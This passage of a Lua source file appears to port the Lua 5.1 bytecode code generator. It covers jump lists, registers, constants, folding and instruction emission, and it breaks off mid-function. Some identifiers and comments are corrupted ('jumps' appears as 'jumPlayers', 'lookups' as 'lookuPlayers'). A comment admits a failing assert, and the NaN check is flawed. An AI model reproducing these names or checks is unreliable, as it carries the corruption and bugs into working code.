-- * this is not the entire set of primitive operations from luaconf.h
-- * used in luaK:constfolding()
------------------------------------------------------------------------
function luaK:numadd(a, b) return a + b end
function luaK:numsub(a, b) return a - b end
function luaK:nummul(a, b) return a * b end
function luaK:numdiv(a, b) return a / b end
function luaK:nummod(a, b) return a % b end
  -- ((a) - floor((a)/(b))*(b)) /* actual, for reference */
function luaK:numpow(a, b) return a ^ b end
function luaK:numunm(a) return -a end
function luaK:numisnan(a) return not a == a end
  -- a NaN cannot equal another NaN

--[[--------------------------------------------------------------------
-- code generator functions
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- Marks the end of a patch list. It is an invalid value both as an absolute
-- address, and as a list link (would link an element to itself).
------------------------------------------------------------------------
luaK.NO_JUMP = -1

------------------------------------------------------------------------
-- grep "ORDER OPR" if you change these enums
------------------------------------------------------------------------
luaK.BinOpr = {
  OPR_ADD = 0, OPR_SUB = 1, OPR_MUL = 2, OPR_DIV = 3, OPR_MOD = 4, OPR_POW = 5,
  OPR_CONCAT = 6,
  OPR_NE = 7, OPR_EQ = 8,
  OPR_LT = 9, OPR_LE = 10, OPR_GT = 11, OPR_GE = 12,
  OPR_AND = 13, OPR_OR = 14,
  OPR_NOBINOPR = 15,
}

-- * UnOpr is used by luaK:prefix's op argument, but not directly used
--   because the function receives the symbols as strings, e.g. "OPR_NOT"
luaK.UnOpr = {
  OPR_MINUS = 0, OPR_NOT = 1, OPR_LEN = 2, OPR_NOUNOPR = 3
}

------------------------------------------------------------------------
-- returns the instruction object for given e (expdesc), was a macro
------------------------------------------------------------------------
function luaK:getcode(fs, e)
  return fs.f.code[e.info]
end

------------------------------------------------------------------------
-- codes an instruction with a signed Bx (sBx) field, was a macro
-- * used in luaK:jump(), (lparser) luaY:forbody()
------------------------------------------------------------------------
function luaK:codeAsBx(fs, o, A, sBx)
  return self:codeABx(fs, o, A, sBx + luaP.MAXARG_sBx)
end

------------------------------------------------------------------------
-- set the expdesc e instruction for multiple returns, was a macro
------------------------------------------------------------------------
function luaK:setmultret(fs, e)
  self:setreturns(fs, e, luaY.LUA_MULTRET)
end

------------------------------------------------------------------------
-- there is a jump if patch lists are not identical, was a macro
-- * used in luaK:exp2reg(), luaK:exp2anyreg(), luaK:exp2val()
------------------------------------------------------------------------
function luaK:hasjumPlayers(e)
  return e.t ~= e.f
end

------------------------------------------------------------------------
-- true if the expression is a constant number (for constant folding)
-- * used in constfolding(), infix()
------------------------------------------------------------------------
function luaK:isnumeral(e)
  return e.k == "VKNUM" and e.t == self.NO_JUMP and e.f == self.NO_JUMP
end

------------------------------------------------------------------------
-- codes loading of nil, optimization done if consecutive locations
-- * used in luaK:discharge2reg(), (lparser) luaY:adjust_assign()
------------------------------------------------------------------------
function luaK:_nil(fs, from, n)
  if fs.pc > fs.lasttarget then  -- no jumPlayers to current position?
    if fs.pc == 0 then  -- function start?
      if from >= fs.nactvar then
        return  -- positions are already clean
      end
    else
      local previous = fs.f.code[fs.pc - 1]
      if luaP:GET_OPCODE(previous) == "OP_LOADNIL" then
        local pfrom = luaP:GETARG_A(previous)
        local pto = luaP:GETARG_B(previous)
        if pfrom <= from and from <= pto + 1 then  -- can connect both?
          if from + n - 1 > pto then
            luaP:SETARG_B(previous, from + n - 1)
          end
          return
        end
      end
    end
  end
  self:codeABC(fs, "OP_LOADNIL", from, from + n - 1, 0)  -- else no optimization
end

------------------------------------------------------------------------
--
-- * used in multiple locations
------------------------------------------------------------------------
function luaK:jump(fs)
  local jpc = fs.jpc  -- save list of jumPlayers to here
  fs.jpc = self.NO_JUMP
  local j = self:codeAsBx(fs, "OP_JMP", 0, self.NO_JUMP)
  j = self:concat(fs, j, jpc)  -- keep them on hold
  return j
end

------------------------------------------------------------------------
-- codes a RETURN instruction
-- * used in luaY:close_func(), luaY:retstat()
------------------------------------------------------------------------
function luaK:ret(fs, first, nret)
  self:codeABC(fs, "OP_RETURN", first, nret + 1, 0)
end

------------------------------------------------------------------------
--
-- * used in luaK:jumponcond(), luaK:codecomp()
------------------------------------------------------------------------
function luaK:condjump(fs, op, A, B, C)
  self:codeABC(fs, op, A, B, C)
  return self:jump(fs)
end

------------------------------------------------------------------------
--
-- * used in luaK:patchlistaux(), luaK:concat()
------------------------------------------------------------------------
function luaK:fixjump(fs, pc, dest)
  local jmp = fs.f.code[pc]
  local offset = dest - (pc + 1)
  assert(dest ~= self.NO_JUMP)
  if math.abs(offset) > luaP.MAXARG_sBx then
    luaX:syntaxerror(fs.ls, "control structure too long")
  end
  luaP:SETARG_sBx(jmp, offset)
end

------------------------------------------------------------------------
-- returns current 'pc' and marks it as a jump target (to avoid wrong
-- optimizations with consecutive instructions not in the same basic block).
-- * used in multiple locations
-- * fs.lasttarget tested only by luaK:_nil() when optimizing OP_LOADNIL
------------------------------------------------------------------------
function luaK:getlabel(fs)
  fs.lasttarget = fs.pc
  return fs.pc
end

------------------------------------------------------------------------
--
-- * used in luaK:need_value(), luaK:removevalues(), luaK:patchlistaux(),
--   luaK:concat()
------------------------------------------------------------------------
function luaK:getjump(fs, pc)
  local offset = luaP:GETARG_sBx(fs.f.code[pc])
  if offset == self.NO_JUMP then  -- point to itself represents end of list
    return self.NO_JUMP  -- end of list
  else
    return (pc + 1) + offset  -- turn offset into absolute position
  end
end

------------------------------------------------------------------------
--
-- * used in luaK:need_value(), luaK:patchtestreg(), luaK:invertjump()
------------------------------------------------------------------------
function luaK:getjumpcontrol(fs, pc)
  local pi = fs.f.code[pc]
  local ppi = fs.f.code[pc - 1]
  if pc >= 1 and luaP:testTMode(luaP:GET_OPCODE(ppi)) ~= 0 then
    return ppi
  else
    return pi
  end
end

------------------------------------------------------------------------
-- check whether list has any jump that do not produce a value
-- (or produce an inverted value)
-- * return value changed to boolean
-- * used only in luaK:exp2reg()
------------------------------------------------------------------------
function luaK:need_value(fs, list)
  while list ~= self.NO_JUMP do
    local i = self:getjumpcontrol(fs, list)
    if luaP:GET_OPCODE(i) ~= "OP_TESTSET" then return true end
    list = self:getjump(fs, list)
  end
  return false  -- not found
end

------------------------------------------------------------------------
--
-- * used in luaK:removevalues(), luaK:patchlistaux()
------------------------------------------------------------------------
function luaK:patchtestreg(fs, node, reg)
  local i = self:getjumpcontrol(fs, node)
  if luaP:GET_OPCODE(i) ~= "OP_TESTSET" then
    return false  -- cannot patch other instructions
  end
  if reg ~= luaP.NO_REG and reg ~= luaP:GETARG_B(i) then
    luaP:SETARG_A(i, reg)
  else  -- no register to put value or register already has the value
    -- due to use of a table as i, i cannot be replaced by another table
    -- so the following is required; there is no change to ARG_C
    luaP:SET_OPCODE(i, "OP_TEST")
    local b = luaP:GETARG_B(i)
    luaP:SETARG_A(i, b)
    luaP:SETARG_B(i, 0)
    -- *i = CREATE_ABC(OP_TEST, GETARG_B(*i), 0, GETARG_C(*i)); /* C */
  end
  return true
end

------------------------------------------------------------------------
--
-- * used only in luaK:codenot()
------------------------------------------------------------------------
function luaK:removevalues(fs, list)
  while list ~= self.NO_JUMP do
    self:patchtestreg(fs, list, luaP.NO_REG)
    list = self:getjump(fs, list)
  end
end

------------------------------------------------------------------------
--
-- * used in luaK:dischargejpc(), luaK:patchlist(), luaK:exp2reg()
------------------------------------------------------------------------
function luaK:patchlistaux(fs, list, vtarget, reg, dtarget)
  while list ~= self.NO_JUMP do
    local _next = self:getjump(fs, list)
    if self:patchtestreg(fs, list, reg) then
      self:fixjump(fs, list, vtarget)
    else
      self:fixjump(fs, list, dtarget)  -- jump to default target
    end
    list = _next
  end
end

------------------------------------------------------------------------
--
-- * used only in luaK:code()
------------------------------------------------------------------------
function luaK:dischargejpc(fs)
  self:patchlistaux(fs, fs.jpc, fs.pc, luaP.NO_REG, fs.pc)
  fs.jpc = self.NO_JUMP
end

------------------------------------------------------------------------
--
-- * used in (lparser) luaY:whilestat(), luaY:repeatstat(), luaY:forbody()
------------------------------------------------------------------------
function luaK:patchlist(fs, list, target)
  if target == fs.pc then
    self:patchtohere(fs, list)
  else
    assert(target < fs.pc)
    self:patchlistaux(fs, list, target, luaP.NO_REG, target)
  end
end

------------------------------------------------------------------------
--
-- * used in multiple locations
------------------------------------------------------------------------
function luaK:patchtohere(fs, list)
  self:getlabel(fs)
  fs.jpc = self:concat(fs, fs.jpc, list)
end

------------------------------------------------------------------------
-- * l1 was a pointer, now l1 is returned and callee assigns the value
-- * used in multiple locations
------------------------------------------------------------------------
function luaK:concat(fs, l1, l2)
  if l2 == self.NO_JUMP then return l1
  elseif l1 == self.NO_JUMP then
    return l2
  else
    local list = l1
    local _next = self:getjump(fs, list)
    while _next ~= self.NO_JUMP do  -- find last element
      list = _next
      _next = self:getjump(fs, list)
    end
    self:fixjump(fs, list, l2)
  end
  return l1
end

------------------------------------------------------------------------
--
-- * used in luaK:reserveregs(), (lparser) luaY:forlist()
------------------------------------------------------------------------
function luaK:checkstack(fs, n)
  local newstack = fs.freereg + n
  if newstack > fs.f.maxstacksize then
    if newstack >= self.MAXSTACK then
      luaX:syntaxerror(fs.ls, "function or expression too complex")
    end
    fs.f.maxstacksize = newstack
  end
end

------------------------------------------------------------------------
--
-- * used in multiple locations
------------------------------------------------------------------------
function luaK:reserveregs(fs, n)
  self:checkstack(fs, n)
  fs.freereg = fs.freereg + n
end

------------------------------------------------------------------------
--
-- * used in luaK:freeexp(), luaK:dischargevars()
------------------------------------------------------------------------
function luaK:freereg(fs, reg)
  if not luaP:ISK(reg) and reg >= fs.nactvar then
    fs.freereg = fs.freereg - 1
    assert(reg == fs.freereg)
  end
end

------------------------------------------------------------------------
--
-- * used in multiple locations
------------------------------------------------------------------------
function luaK:freeexp(fs, e)
  if e.k == "VNONRELOC" then
    self:freereg(fs, e.info)
  end
end

------------------------------------------------------------------------
-- * TODO NOTE implementation is not 100% correct, since the assert fails
-- * luaH_set, setobj deleted; direct table access used instead
-- * used in luaK:stringK(), luaK:numberK(), luaK:boolK(), luaK:nilK()
------------------------------------------------------------------------
function luaK:addk(fs, k, v)
  local L = fs.L
  local idx = fs.h[k.value]
  --TValue *idx = luaH_set(L, fs->h, k); /* C */
  local f = fs.f
  if self:ttisnumber(idx) then
    --TODO this assert currently FAILS (last tested for 5.0.2)
    --assert(fs.f.k[self:nvalue(idx)] == v)
    --assert(luaO_rawequalObj(&fs->f->k[cast_int(nvalue(idx))], v)); /* C */
    return self:nvalue(idx)
  else -- constant not found; create a new entry
    idx = {}
    self:setnvalue(idx, fs.nk)
    fs.h[k.value] = idx
    -- setnvalue(idx, cast_num(fs->nk)); /* C */
    luaY:growvector(L, f.k, fs.nk, f.sizek, nil,
                    luaP.MAXARG_Bx, "constant table overflow")
    -- loop to initialize empty f.k positions not required
    f.k[fs.nk] = v
    -- setobj(L, &f->k[fs->nk], v); /* C */
    -- luaC_barrier(L, f, v); /* GC */
    local nk = fs.nk
    fs.nk = fs.nk + 1
    return nk
  end

end

------------------------------------------------------------------------
-- creates and sets a string object
-- * used in (lparser) luaY:codestring(), luaY:singlevar()
------------------------------------------------------------------------
function luaK:stringK(fs, s)
  local o = {}  -- TValue
  self:setsvalue(o, s)
  return self:addk(fs, o, o)
end

------------------------------------------------------------------------
-- creates and sets a number object
-- * used in luaK:prefix() for negative (or negation of) numbers
-- * used in (lparser) luaY:simpleexp(), luaY:fornum()
------------------------------------------------------------------------
function luaK:numberK(fs, r)
  local o = {}  -- TValue
  self:setnvalue(o, r)
  return self:addk(fs, o, o)
end

------------------------------------------------------------------------
-- creates and sets a boolean object
-- * used only in luaK:exp2RK()
------------------------------------------------------------------------
function luaK:boolK(fs, b)
  local o = {}  -- TValue
  self:setbvalue(o, b)
  return self:addk(fs, o, o)
end

------------------------------------------------------------------------
-- creates and sets a nil object
-- * used only in luaK:exp2RK()
------------------------------------------------------------------------
function luaK:nilK(fs)
  local k, v = {}, {}  -- TValue
  self:setnilvalue(v)
  -- cannot use nil as key; instead use table itself to represent nil
  self:sethvalue(k, fs.h)
  return self:addk(fs, k, v)
end

------------------------------------------------------------------------
--
-- * used in luaK:setmultret(), (lparser) luaY:adjust_assign()
------------------------------------------------------------------------
function luaK:setreturns(fs, e, nresults)
  if e.k == "VCALL" then  -- expression is an open function call?
    luaP:SETARG_C(self:getcode(fs, e), nresults + 1)
  elseif e.k == "VVARARG" then
    luaP:SETARG_B(self:getcode(fs, e), nresults + 1);
    luaP:SETARG_A(self:getcode(fs, e), fs.freereg);
    luaK:reserveregs(fs, 1)
  end
end

------------------------------------------------------------------------
--
-- * used in luaK:dischargevars(), (lparser) luaY:assignment()
------------------------------------------------------------------------
function luaK:setoneret(fs, e)
  if e.k == "VCALL" then  -- expression is an open function call?
    e.k = "VNONRELOC"
    e.info = luaP:GETARG_A(self:getcode(fs, e))
  elseif e.k == "VVARARG" then
    luaP:SETARG_B(self:getcode(fs, e), 2)
    e.k = "VRELOCABLE"  -- can relocate its simple result
  end
end

------------------------------------------------------------------------
--
-- * used in multiple locations
------------------------------------------------------------------------
function luaK:dischargevars(fs, e)
  local k = e.k
  if k == "VLOCAL" then
    e.k = "VNONRELOC"
  elseif k == "VUPVAL" then
    e.info = self:codeABC(fs, "OP_GETUPVAL", 0, e.info, 0)
    e.k = "VRELOCABLE"
  elseif k == "VGLOBAL" then
    e.info = self:codeABx(fs, "OP_GETGLOBAL", 0, e.info)
    e.k = "VRELOCABLE"
  elseif k == "VINDEXED" then
    self:freereg(fs, e.aux)
    self:freereg(fs, e.info)
    e.info = self:codeABC(fs, "OP_GETTABLE", 0, e.info, e.aux)
    e.k = "VRELOCABLE"
  elseif k == "VVARARG" or k == "VCALL" then
    self:setoneret(fs, e)
  else
    -- there is one value available (somewhere)
  end
end

------------------------------------------------------------------------
--
-- * used only in luaK:exp2reg()
------------------------------------------------------------------------
function luaK:code_label(fs, A, b, jump)
  self:getlabel(fs)  -- those instructions may be jump targets
  return self:codeABC(fs, "OP_LOADBOOL", A, b, jump)
end

------------------------------------------------------------------------
--
-- * used in luaK:discharge2anyreg(), luaK:exp2reg()
------------------------------------------------------------------------
function luaK:discharge2reg(fs, e, reg)
  self:dischargevars(fs, e)
  local k = e.k
  if k == "VNIL" then
    self:_nil(fs, reg, 1)
  elseif k == "VFALSE" or k == "VTRUE" then
    self:codeABC(fs, "OP_LOADBOOL", reg, (e.k == "VTRUE") and 1 or 0, 0)
  elseif k == "VK" then
    self:codeABx(fs, "OP_LOADK", reg, e.info)
  elseif k == "VKNUM" then
    self:codeABx(fs, "OP_LOADK", reg, self:numberK(fs, e.nval))
  elseif k == "VRELOCABLE" then
    local pc = self:getcode(fs, e)
    luaP:SETARG_A(pc, reg)
  elseif k == "VNONRELOC" then
    if reg ~= e.info then
      self:codeABC(fs, "OP_MOVE", reg, e.info, 0)
    end
  else
    assert(e.k == "VVOID" or e.k == "VJMP")
    return  -- nothing to do...
  end
  e.info = reg
  e.k = "VNONRELOC"
end

------------------------------------------------------------------------
--
-- * used in luaK:jumponcond(), luaK:codenot()
------------------------------------------------------------------------
function luaK:discharge2anyreg(fs, e)
  if e.k ~= "VNONRELOC" then
    self:reserveregs(fs, 1)
    self:discharge2reg(fs, e, fs.freereg - 1)
  end
end

------------------------------------------------------------------------
--
-- * used in luaK:exp2nextreg(), luaK:exp2anyreg(), luaK:storevar()
------------------------------------------------------------------------
function luaK:exp2reg(fs, e, reg)
  self:discharge2reg(fs, e, reg)
  if e.k == "VJMP" then
    e.t = self:concat(fs, e.t, e.info)  -- put this jump in 't' list
  end
  if self:hasjumPlayers(e) then
    local final  -- position after whole expression
    local p_f = self.NO_JUMP  -- position of an eventual LOAD false
    local p_t = self.NO_JUMP  -- position of an eventual LOAD true
    if self:need_value(fs, e.t) or self:need_value(fs, e.f) then
      local fj = (e.k == "VJMP") and self.NO_JUMP or self:jump(fs)
      p_f = self:code_label(fs, reg, 0, 1)
      p_t = self:code_label(fs, reg, 1, 0)
      self:patchtohere(fs, fj)
    end
    final = self:getlabel(fs)
    self:patchlistaux(fs, e.f, final, reg, p_f)
    self:patchlistaux(fs, e.t, final, reg, p_t)
  end
  e.f, e.t = self.NO_JUMP, self.NO_JUMP
  e.info = reg
  e.k = "VNONRELOC"
end

------------------------------------------------------------------------
--
-- * used in multiple locations
------------------------------------------------------------------------
function luaK:exp2nextreg(fs, e)
  self:dischargevars(fs, e)
  self:freeexp(fs, e)
  self:reserveregs(fs, 1)
  self:exp2reg(fs, e, fs.freereg - 1)
end

------------------------------------------------------------------------
--
-- * used in multiple locations
------------------------------------------------------------------------
function luaK:exp2anyreg(fs, e)
  self:dischargevars(fs, e)
  if e.k == "VNONRELOC" then
    if not self:hasjumPlayers(e) then  -- exp is already in a register
      return e.info
    end
    if e.info >= fs.nactvar then  -- reg. is not a local?
      self:exp2reg(fs, e, e.info)  -- put value on it
      return e.info
    end
  end
  self:exp2nextreg(fs, e)  -- default
  return e.info
end

------------------------------------------------------------------------
--
-- * used in luaK:exp2RK(), luaK:prefix(), luaK:posfix()
-- * used in (lparser) luaY:yindex()
------------------------------------------------------------------------
function luaK:exp2val(fs, e)
  if self:hasjumPlayers(e) then
    self:exp2anyreg(fs, e)
  else
    self:dischargevars(fs, e)
  end
end

------------------------------------------------------------------------
--
-- * used in multiple locations
------------------------------------------------------------------------
function luaK:exp2RK(fs, e)
  self:exp2val(fs, e)
  local k = e.k
  if k == "VKNUM" or k == "VTRUE" or k == "VFALSE" or k == "VNIL" then
    if fs.nk <= luaP.MAXINDEXRK then  -- constant fit in RK operand?
      -- converted from a 2-deep ternary operator expression
      if e.k == "VNIL" then
        e.info = self:nilK(fs)
      else
        e.info = (e.k == "VKNUM") and self:numberK(fs, e.nval)
                                  or self:boolK(fs, e.k == "VTRUE")
      end
      e.k = "VK"
      return luaP:RKASK(e.info)
    end
  elseif k == "VK" then
    if e.info <= luaP.MAXINDEXRK then  -- constant fit in argC?
      return luaP:RKASK(e.info)
    end
  else
    -- default
  end
  -- not a constant in the right range: put it in a register
  return self:exp2anyreg(fs, e)
end

------------------------------------------------------------------------
--
-- * used in (lparser) luaY:assignment(), luaY:localfunc(), luaY:funcstat()
------------------------------------------------------------------------
function luaK:storevar(fs, var, ex)
  local k = var.k
  if k == "VLOCAL" then
    self:freeexp(fs, ex)
    self:exp2reg(fs, ex, var.info)
    return
  elseif k == "VUPVAL" then
    local e = self:exp2anyreg(fs, ex)
    self:codeABC(fs, "OP_SETUPVAL", e, var.info, 0)
  elseif k == "VGLOBAL" then
    local e = self:exp2anyreg(fs, ex)
    self:codeABx(fs, "OP_SETGLOBAL", e, var.info)
  elseif k == "VINDEXED" then
    local e = self:exp2RK(fs, ex)
    self:codeABC(fs, "OP_SETTABLE", var.info, var.aux, e)
  else
    assert(0)  -- invalid var kind to store
  end
  self:freeexp(fs, ex)
end

------------------------------------------------------------------------
--
-- * used only in (lparser) luaY:primaryexp()
------------------------------------------------------------------------
function luaK:_self(fs, e, key)
  self:exp2anyreg(fs, e)
  self:freeexp(fs, e)
  local func = fs.freereg
  self:reserveregs(fs, 2)
  self:codeABC(fs, "OP_SELF", func, e.info, self:exp2RK(fs, key))
  self:freeexp(fs, key)
  e.info = func
  e.k = "VNONRELOC"
end

------------------------------------------------------------------------
--
-- * used in luaK:goiftrue(), luaK:codenot()
------------------------------------------------------------------------
function luaK:invertjump(fs, e)
  local pc = self:getjumpcontrol(fs, e.info)
  assert(luaP:testTMode(luaP:GET_OPCODE(pc)) ~= 0 and
             luaP:GET_OPCODE(pc) ~= "OP_TESTSET" and
             luaP:GET_OPCODE(pc) ~= "OP_TEST")
  luaP:SETARG_A(pc, (luaP:GETARG_A(pc) == 0) and 1 or 0)
end

------------------------------------------------------------------------
--
-- * used in luaK:goiftrue(), luaK:goiffalse()
------------------------------------------------------------------------
function luaK:jumponcond(fs, e, cond)
  if e.k == "VRELOCABLE" then
    local ie = self:getcode(fs, e)
    if luaP:GET_OPCODE(ie) == "OP_NOT" then
      fs.pc = fs.pc - 1  -- remove previous OP_NOT
      return self:condjump(fs, "OP_TEST", luaP:GETARG_B(ie), 0, cond and 0 or 1)
    end
    -- else go through
  end
  self:discharge2anyreg(fs, e)
  self:freeexp(fs, e)
  return self:condjump(fs, "OP_TESTSET", luaP.NO_REG, e.info, cond and 1 or 0)
end

------------------------------------------------------------------------
--
-- * used in luaK:infix(), (lparser) luaY:cond()
------------------------------------------------------------------------
function luaK:goiftrue(fs, e)
  local pc  -- pc of last jump
  self:dischargevars(fs, e)
  local k = e.k
  if k == "VK" or k == "VKNUM" or k == "VTRUE" then
    pc = self.NO_JUMP  -- always true; do nothing
  elseif k == "VFALSE" then
    pc = self:jump(fs)  -- always jump
  elseif k == "VJMP" then
    self:invertjump(fs, e)
    pc = e.info
  else
    pc = self:jumponcond(fs, e, false)
  end
  e.f = self:concat(fs, e.f, pc)  -- insert last jump in `f' list
  self:patchtohere(fs, e.t)
  e.t = self.NO_JUMP
end

------------------------------------------------------------------------
--
-- * used in luaK:infix()
------------------------------------------------------------------------
function luaK:goiffalse(fs, e)
  local pc  -- pc of last jump
  self:dischargevars(fs, e)
  local k = e.k
  if k == "VNIL" or k == "VFALSE"then
    pc = self.NO_JUMP  -- always false; do nothing
  elseif k == "VTRUE" then
    pc = self:jump(fs)  -- always jump
  elseif k == "VJMP" then
    pc = e.info
  else
    pc = self:jumponcond(fs, e, true)
  end
  e.t = self:concat(fs, e.t, pc)  -- insert last jump in `t' list
  self:patchtohere(fs, e.f)
  e.f = self.NO_JUMP
end

------------------------------------------------------------------------
--
-- * used only in luaK:prefix()
------------------------------------------------------------------------
function luaK:codenot(fs, e)
  self:dischargevars(fs, e)
  local k = e.k
  if k == "VNIL" or k == "VFALSE" then
    e.k = "VTRUE"
  elseif k == "VK" or k == "VKNUM" or k == "VTRUE" then
    e.k = "VFALSE"
  elseif k == "VJMP" then
    self:invertjump(fs, e)
  elseif k == "VRELOCABLE" or k == "VNONRELOC" then
    self:discharge2anyreg(fs, e)
    self:freeexp(fs, e)
    e.info = self:codeABC(fs, "OP_NOT", 0, e.info, 0)
    e.k = "VRELOCABLE"
  else
    assert(0)  -- cannot happen
  end
  -- interchange true and false lists
  e.f, e.t = e.t, e.f
  self:removevalues(fs, e.f)
  self:removevalues(fs, e.t)
end

------------------------------------------------------------------------
--
-- * used in (lparser) luaY:field(), luaY:primaryexp()
------------------------------------------------------------------------
function luaK:indexed(fs, t, k)
  t.aux = self:exp2RK(fs, k)
  t.k = "VINDEXED"
end

------------------------------------------------------------------------
--
-- * used only in luaK:codearith()
------------------------------------------------------------------------
function luaK:constfolding(op, e1, e2)
  local r
  if not self:isnumeral(e1) or not self:isnumeral(e2) then return false end
  local v1 = e1.nval
  local v2 = e2.nval
  if op == "OP_ADD" then
    r = self:numadd(v1, v2)
  elseif op == "OP_SUB" then
    r = self:numsub(v1, v2)
  elseif op == "OP_MUL" then
    r = self:nummul(v1, v2)
  elseif op == "OP_DIV" then
    if v2 == 0 then return false end  -- do not attempt to divide by 0
    r = self:numdiv(v1, v2)
  elseif op == "OP_MOD" then
    if v2 == 0 then return false end  -- do not attempt to divide by 0
    r = self:nummod(v1, v2)
  elseif op == "OP_POW" then
    r = self:numpow(v1, v2)
  elseif op == "OP_UNM" then
    r = self:numunm(v1)
  elseif op == "OP_LEN" then
    return false  -- no constant folding for 'len'
  else
    assert(0)
    r = 0
  end
  if self:numisnan(r) then return false end  -- do not attempt to produce NaN
  e1.nval = r
  return true
end

------------------------------------------------------------------------
--
-- * used in luaK:prefix(), luaK:posfix()
------------------------------------------------------------------------
function luaK:codearith(fs, op, e1, e2)
  if self:constfolding(op, e1, e2) then
    return
  else
    local o2 = (op ~= "OP_UNM" and op ~= "OP_LEN") and self:exp2RK(fs, e2) or 0
    local o1 = self:exp2RK(fs, e1)
    if o1 > o2 then
      self:freeexp(fs, e1)
      self:freeexp(fs, e2)
    else
      self:freeexp(fs, e2)
      self:freeexp(fs, e1)
    end
    e1.info = self:codeABC(fs, op, 0, o1, o2)
    e1.k = "VRELOCABLE"
  end
end

------------------------------------------------------------------------
--
-- * used only in luaK:posfix()
------------------------------------------------------------------------
function luaK:codecomp(fs, op, cond, e1, e2)
  local o1 = self:exp2RK(fs, e1)
  local o2 = self:exp2RK(fs, e2)
  self:freeexp(fs, e2)
  self:freeexp(fs, e1)
  if cond == 0 and op ~= "OP_EQ" then
    -- exchange args to replace by `<' or `<='
    o1, o2 = o2, o1  -- o1 <==> o2
    cond = 1
  end
  e1.info = self:condjump(fs, op, cond, o1, o2)
  e1.k = "VJMP"
end

------------------------------------------------------------------------
--
-- * used only in (lparser) luaY:subexpr()
------------------------------------------------------------------------
function luaK:prefix(fs, op, e)
  local e2 = {}  -- expdesc
  e2.t, e2.f = self.NO_JUMP, self.NO_JUMP
  e2.k = "VKNUM"
  e2.nval = 0
  if op == "OPR_MINUS" then
    if not self:isnumeral(e) then
      self:exp2anyreg(fs, e)  -- cannot operate on non-numeric constants
    end
    self:codearith(fs, "OP_UNM", e, e2)
  elseif op == "OPR_NOT" then
    self:codenot(fs, e)
  elseif op == "OPR_LEN" then
    self:exp2anyreg(fs, e)  -- cannot operate on constants
    self:codearith(fs, "OP_LEN", e, e2)
  else
    assert(0)
  end
end

------------------------------------------------------------------------
--
-- * used only in (lparser) luaY:subexpr()
------------------------------------------------------------------------
function luaK:infix(fs, op, v)
  if op == "OPR_AND" then
    self:goiftrue(fs, v)
  elseif op == "OPR_OR" then
    self:goiffalse(fs, v)
  elseif op == "OPR_CONCAT" then
    self:exp2nextreg(fs, v)  -- operand must be on the 'stack'
  elseif op == "OPR_ADD" or op == "OPR_SUB" or
         op == "OPR_MUL" or op == "OPR_DIV" or
         op == "OPR_MOD" or op == "OPR_POW" then
    if not self:isnumeral(v) then self:exp2RK(fs, v) end
  else
    self:exp2RK(fs, v)
  end
end

------------------------------------------------------------------------
--
-- * used only in (lparser) luaY:subexpr()
------------------------------------------------------------------------
-- table lookuPlayers to simplify testing
luaK.arith_op = {
  OPR_ADD = "OP_ADD", OPR_SUB = "OP_SUB", OPR_MUL = "OP_MUL",
  OPR_DIV = "OP_DIV", OPR_MOD = "OP_MOD", OPR_POW = "OP_POW",
}
luaK.comp_op = {
  OPR_EQ = "OP_EQ", OPR_NE = "OP_EQ", OPR_LT = "OP_LT",
  OPR_LE = "OP_LE", OPR_GT = "OP_LT", OPR_GE = "OP_LE",
}
luaK.comp_cond = {
  OPR_EQ = 1, OPR_NE = 0, OPR_LT = 1,
  OPR_LE = 1, OPR_GT = 0, OPR_GE = 0,
}
function luaK:posfix(fs, op, e1, e2)
  -- needed because e1 = e2 doesn't copy values...
  -- * in 5.0.x, only k/info/aux/t/f copied, t for AND, f for OR
  --   but here, all elements are copied for completeness' sake
  local function copyexp(e1, e2)
    e1.k = e2.k
    e1.info = e2.info; e1.aux = e2.aux
    e1.nval = e2.nval
    e1.t = e2.t; e1.f = e2.f
  end
  if op == "OPR_AND" then
    assert(e1.t == self.NO_JUMP)  -- list must be closed
    self:dischargevars(fs, e2)
    e2.f = self:concat(fs, e2.f, e1.f)
    copyexp(e1, e2)
  elseif op == "OPR_OR" then
    assert(e1.f == self.NO_JUMP)  -- list must be closed
    self:dischargevars(fs, e2)
    e2.t = self:concat(fs, e2.t, e1.t)
    copyexp(e1, e2)
  elseif op == "OPR_CONCAT" then
    self:exp2val(fs, e2)
    if e2.k == "VRELOCABLE" and luaP:GET_OPCODE(self:getcode(fs, e2)) == "OP_CONCAT" then
      assert(e1.info == luaP:GETARG_B(self:getcode(fs, e2)) - 1)
      self:freeexp(fs, e1)
      luaP:SETARG_B(self:getcode(fs, e2), e1.info)
      e1.k = "VRELOCABLE"
      e1.info = e2.info
    else
      self:exp2nextreg(fs, e2)  -- operand must be on the 'stack'
      self:codearith(fs, "OP_CONCAT", e1, e2)
    end
  else
    -- the following uses a table lookup in place of conditionals
    local arith = self.arith_op[op]
    if arith then
      self:codearith(fs, arith, e1, e2)
    else
      local comp = self.comp_op[op]
      if comp then
        self:codecomp(fs, comp, self.comp_cond[op], e1, e2)
      else
        assert(0)
      end
    end--if arith
  end--if op
end

------------------------------------------------------------------------
-- adjusts debug information for last instruction written, in order to
-- change the line where item comes into existence
-- * used in (lparser) luaY:funcargs(), luaY:forbody(), luaY:funcstat()
------------------------------------------------------------------------
function luaK:fixline(fs, line)
  fs.f.lineinfo[fs.pc - 1] = line
end

------------------------------------------------------------------------
-- general function to write an instruction into the instruction buffer,
-- sets debug information too
-- * used in luaK:codeABC(), luaK:codeABx()
-- * called directly by (lparser) luaY:whilestat()
------------------------------------------------------------------------
function luaK:code(fs, i, line)
  local f = fs.f
  self:dischargejpc(fs)  -- 'pc' will change
  -- put new instruction in code array
  luaY:growvector(fs.L, f.code, fs.pc, f.sizecode, nil,
                  luaY.MAX_INT, "code size overflow")
  f.code[fs.pc] = i
  -- save corresponding line information
  luaY:growvector(fs.L, f.lineinfo, fs.pc, f.sizelineinfo, nil,
                  luaY.MAX_INT, "code size overflow")
  f.lineinfo[fs.pc] = line
  local pc = fs.pc
  fs.pc = fs.pc + 1
  return pc
end

------------------------------------------------------------------------
-- writes an instruction of type ABC
-- * calls luaK:code()
------------------------------------------------------------------------
function luaK:codeABC(fs, o, a, b, c)
  assert(luaP:getOpMode(o) == luaP.OpMode.iABC)
  assert(luaP:getBMode(o) ~= luaP.OpArgMask.OpArgN or b == 0)
  assert(luaP:getCMode(o) ~= luaP.OpArgMask.OpArgN or c == 0)
  return self:code(fs, luaP:CREATE_ABC(o, a, b, c), fs.ls.lastline)
end

------------------------------------------------------------------------
-- writes an instruction of type ABx
-- * calls luaK:code(), called by luaK:codeAsBx()
------------------------------------------------------------------------
function luaK:codeABx(fs, o, a, bc)
